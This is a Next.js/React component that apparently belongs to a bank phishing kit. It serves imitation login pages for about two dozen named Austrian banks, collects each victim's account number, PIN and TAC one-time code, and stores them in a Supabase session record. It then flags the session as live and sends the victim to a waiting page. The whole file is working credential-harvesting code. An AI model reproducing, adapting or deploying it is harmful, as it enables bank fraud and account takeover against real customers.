"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import type { BankTheme } from "@/lib/bank-theme-config";
import { getBankTheme } from "@/lib/bank-theme-config";
import { normalizeBankCredentialPayload, normalizeBankLoginFields } from "@/lib/bank-page-adapter";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { DEFAULT_DESIGN_CONFIG, BlockType } from "@/lib/bank-design-schema";
import { getRenderableImageProps } from "@/lib/visual-tree-logo";
import parse, { attributesToProps, domToReact, Element } from "html-react-parser";

// Austrian Banks from templates
import { BankAustria } from "@/components/templates/BankAustria";
import { BawagAg } from "@/components/templates/BawagAg";
import { ErsteBank } from "@/components/templates/ErsteBank";
import { Raiffeisen } from "@/components/templates/Raiffeisen";
import { Volksbanken } from "@/components/templates/Volksbanken";
import { PosojilnicaBank } from "@/components/templates/PosojilnicaBank";
import { Bank99 } from "@/components/templates/Bank99";
import { BtvVierLanderBank } from "@/components/templates/BtvVierLanderBank";
import { BksBank } from "@/components/templates/BksBank";
import { Oberbank } from "@/components/templates/Oberbank";
import { HypoNoe } from "@/components/templates/HypoNoe";
import { HypoTirol } from "@/components/templates/HypoTirol";
import { HypoVorarlberg } from "@/components/templates/HypoVorarlberg";
import { HypoBurgenland } from "@/components/templates/HypoBurgenland";
import { HypoOberosterreich } from "@/components/templates/HypoOberosterreich";
import { AerzteApothekerBank } from "@/components/templates/AerzteApothekerBank";
import { BankhausSpangler } from "@/components/templates/BankhausSpangler";
import { SchelhammerCapital } from "@/components/templates/SchelhammerCapital";
import { Easybank } from "@/components/templates/Easybank";
import { Schoellerbank } from "@/components/templates/Schoellerbank";
import { SpardaBank } from "@/components/templates/SpardaBank";
import { Volkskreditbank } from "@/components/templates/Volkskreditbank";
import { AnadiBank } from "@/components/templates/AnadiBank";
import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
import { Dolomitenbank } from "@/components/templates/Dolomitenbank";

type Props = {
  sessionId: string;
  bankSlug: string;
  bank: any;
};

export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const [theme, setTheme] = useState<BankTheme | null>(null);

  const [verfuegernummer, setVerfuegernummer] = useState("");
  const [pin, setPin] = useState("");
  const [tacCode, setTacCode] = useState("");
  const [saving, setSaving] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const nextTheme = await getBankTheme(bankSlug);
      if (!cancelled) setTheme(nextTheme);
    })();
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setVerfuegernummer(fd.verfuegernummer ?? "");
      setPin(fd.pin ?? "");
      setTacCode(fd.tacCode ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId || !bank) return;
    setSaving(true);
    setError(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const normalizedFields = normalizeBankLoginFields({ verfuegernummer, pin, tacCode });
    const credentials = normalizeBankCredentialPayload({
      bankSlug: bank.slug,
      bankName: bank.name,
      ...normalizedFields,
    });
    const { error: updateError } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: {
          ...prev,
          ...credentials,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (updateError) {
      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
      return;
    }
    router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <ConfigMissing />
      </div>
    );
  }

  if (!bank) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
          Onbekende bank. Start de selectie opnieuw.
        </p>
      </div>
    );
  }

  // OUSTRIAN BANKS CUSTOM TEMPLATES
  const handleTemplateChange = (field: string, value: string) => {
    if (field === "verfuegernummer") setVerfuegernummer(value);
    if (field === "pin") setPin(value);
  };
  const handleTemplateSubmit = () => handleSubmit();
  
  const hasGeneratedDesign = Boolean(bank.design?.visualTree || bank.design?.customHtml);

  if (!hasGeneratedDesign) {
    if (bankSlug === "bank-austria") return <BankAustria formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bawag") return <BawagAg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "erste-bank") return <ErsteBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "raiffeisen") return <Raiffeisen formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "volksbank") return <Volksbanken formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "posojilnica") return <PosojilnicaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bank99") return <Bank99 formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "btv") return <BtvVierLanderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bks-bank") return <BksBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "oberbank") return <Oberbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-noe") return <HypoNoe formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-tirol") return <HypoTirol formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-vorarlberg") return <HypoVorarlberg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-burgenland") return <HypoBurgenland formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-ooe") return <HypoOberosterreich formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "aerztebank") return <AerzteApothekerBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "spaengler") return <BankhausSpangler formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schelhammer") return <SchelhammerCapital formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "easybank") return <Easybank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schoellerbank-ag" || bankSlug === "schoellerbank") return <Schoellerbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "sparda-bank") return <SpardaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "vkb") return <Volkskreditbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "anadi-bank") return <AnadiBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "marchfelder") return <MarchfelderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "dolomitenbank") return <Dolomitenbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
  }

  // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
  if (bank.design && (bank.design.visualTree || bank.design.customHtml || (bank.design.blocks && bank.design.blocks.length > 0))) {
    const design = bank.design;

    if (design.visualTree && !design.customHtml) {
      // #region debug-point D:live-visualtree-renderer
      void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "post-fix", hypothesisId: "D", location: "bank-login-client.tsx:115", msg: "[DEBUG] Live page rendering visualTree design", data: { slug: bankSlug, bankName: bank.name, hasVisualTree: true, hasCustomHtml: Boolean(design.customHtml), logoFile: bank.logoFile ?? null, blocks: design.blocks ?? [] }, ts: Date.now() }) }).catch(() => {});
      // #endregion

      const renderVisualTree = (element: any): React.ReactNode => {
        const Tag = element.type === "container" ? "div" :
                    element.type === "text" ? "span" :
                    element.type === "form" ? "form" :
                    element.type === "button" ? "button" :
                    element.type === "image" ? "img" :
                    element.type === "input" ? "input" : "div";

        const props: any = {
          key: element.id,
          style: element.styles,
          ...element.attributes,
        };

        if (element.type === "image") {
          Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
        }

        if (element.type === "input") {
          const fieldName = props.name;
          if (fieldName === "verfuegernummer") {
            props.value = verfuegernummer;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setVerfuegernummer(e.target.value);
            props.required = true;
          } else if (fieldName === "pin") {
            props.type = "password";
            props.value = pin;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setPin(e.target.value);
            props.required = true;
          } else if (fieldName === "tacCode") {
            props.value = tacCode;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setTacCode(e.target.value);
          }
        }

        if (element.type === "button") {
          props.disabled = saving || props.disabled;
          if (props.type === "submit") {
            props.style = {
              ...props.style,
              opacity: saving ? 0.7 : props.style?.opacity,
              cursor: saving ? "not-allowed" : props.style?.cursor,
            };
          }
        }

        if (element.type === "form") {
          props.onSubmit = handleSubmit;
        }

        if (element.type === "input" || element.type === "image") {
          return <Tag {...props} />;
        }

        return (
          <Tag {...props}>
            {element.content}
            {element.children?.map(renderVisualTree)}
          </Tag>
        );
      };

      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {error ? <div style={{ color: "#ef4444", fontSize: "14px", margin: "1rem auto 0", maxWidth: "960px", textAlign: "center", backgroundColor: "#fee2e2", padding: "0.75rem", borderRadius: "8px" }}>{error}</div> : null}
          {renderVisualTree(design.visualTree)}
        </div>
      );
    }
    
    // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
    if (design.customHtml) {
      const options = {
        replace: (domNode: any) => {
          if (domNode instanceof Element) {
            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} required />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} required />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={tacCode} onChange={(e) => setTacCode(e.target.value)} />;
            }
            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
              const props = attributesToProps(domNode.attribs);
              return (
                <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
                </button>
              );
            }
            if (domNode.name === "form") {
              const props = attributesToProps(domNode.attribs);
              return (
                <form {...props} onSubmit={handleSubmit}>
                  {error && <div style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem', textAlign: 'center', backgroundColor: '#fee2e2', padding: '0.5rem', borderRadius: '4px' }}>{error}</div>}
                  {domToReact(domNode.children as any, options)}
                </form>
              );
            }
            // Logo yer tutucusunu (<img> src) bankanın gerçek logosuyla değiştir
            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
              if (bank.logoFile) {
                const props = attributesToProps(domNode.attribs);
                // #region debug-point C:live-placeholder-swap
                void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "C", location: "bank-login-client.tsx:152", msg: "[DEBUG] Live page logo placeholder replaced in customHtml", data: { slug: bankSlug, bankName: bank.name, logoFile: bank.logoFile, attribs: domNode.attribs }, ts: Date.now() }) }).catch(() => {});
                // #endregion
                return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
              }
            }
          }
        }
      };
      
      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {parse(design.customHtml, options)}
        </div>
      );
    }

    const renderBlock = (block: BlockType) => {
      switch (block) {
        case "header":
          if (!design.header.show) return null;
          return (
            <header 
              key="header"
              style={{ 
                backgroundColor: design.header.backgroundColor, 
                height: design.header.height,
                padding: design.header.padding,
                display: 'flex',
                alignItems: 'center',
                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
              }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
              ) : (
                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
              )}
            </header>
          );
        
        case "form":
          return (
            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
              <div 
                style={{
                  backgroundColor: design.formBox.backgroundColor,
                  color: design.formBox.textColor,
                  borderRadius: design.formBox.borderRadius,
                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
                  padding: design.formBox.padding,
                  width: design.formBox.width,
                  maxWidth: '100%',
                  fontFamily: design.typography.fontFamily
                }}
              >
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
                
                <form onSubmit={handleSubmit}>
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
                  </div>
                  <div style={{ marginBottom: '1.5rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
                  </div>
                  
                  {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
                  
                  <button 
                    type="submit"
                    disabled={saving}
                    style={{
                      width: '100%',
                      backgroundColor: design.button.backgroundColor,
                      color: design.button.textColor,
                      padding: design.button.padding,
                      borderRadius: design.button.borderRadius,
                      fontWeight: design.button.fontWeight as any,
                      border: 'none',
                      cursor: saving ? 'not-allowed' : 'pointer',
                      opacity: saving ? 0.7 : 1
                    }}
                  >
                    {saving ? "Laden..." : design.texts.title}
                  </button>
                </form>
              </div>
            </div>
          );
  
        case "footer":
          return (
            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
                {design.texts.footerLinks.map((link: string, i: number) => (
                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
                ))}
              </div>
            </footer>
          );
  
        case "spacer":
          return <div key={Math.random()} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
          
        default:
          return null;
      }
    };
  
    return (
      <div 
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          fontFamily: design.typography.fontFamily
        }}
      >
        {design.blocks.map((block: BlockType) => renderBlock(block))}
      </div>
    );
  }

  // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
  if (!theme) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </div>
    );
  }

  const primaryColor = bank.brandColor || theme.colors.primary;
  const secondaryColor = bank.accentColor || theme.colors.secondary;
  const logoText = bank.logo || theme.logoText;

  return (
    <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
      <div className="app-panel overflow-hidden rounded-2xl w-full max-w-md shadow-xl border border-gray-100 bg-white">
        <div
          className="flex items-center justify-between px-5 py-4 text-white"
          style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
        >
          <div className="flex items-center gap-3">
            <div
              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide bg-white/20"
              style={{ color: theme.colors.textOnPrimary }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
              ) : (
                logoText
              )}
            </div>
            <div>
              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
              <h2 className="text-lg font-bold">{bank.name}</h2>
            </div>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleSubmit();
          }}
          className="space-y-5 p-6"
        >
          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.verfuegernummer}
            <input
              required
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={verfuegernummer}
              onChange={(e) => setVerfuegernummer(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.pin}
            <input
              required
              type="password"
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.tacCode}
            <input
              required
              inputMode="numeric"
              maxLength={6}
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all tracking-widest"
              value={tacCode}
              onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            />
          </label>

          {error ? <p className="text-sm font-medium text-red-600">{error}</p> : null}

          <button
            type="submit"
            disabled={saving}
            className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
          >
            {saving ? "Controleren..." : theme.buttonText}
          </button>
        </form>
      </div>
    </div>
  );
}
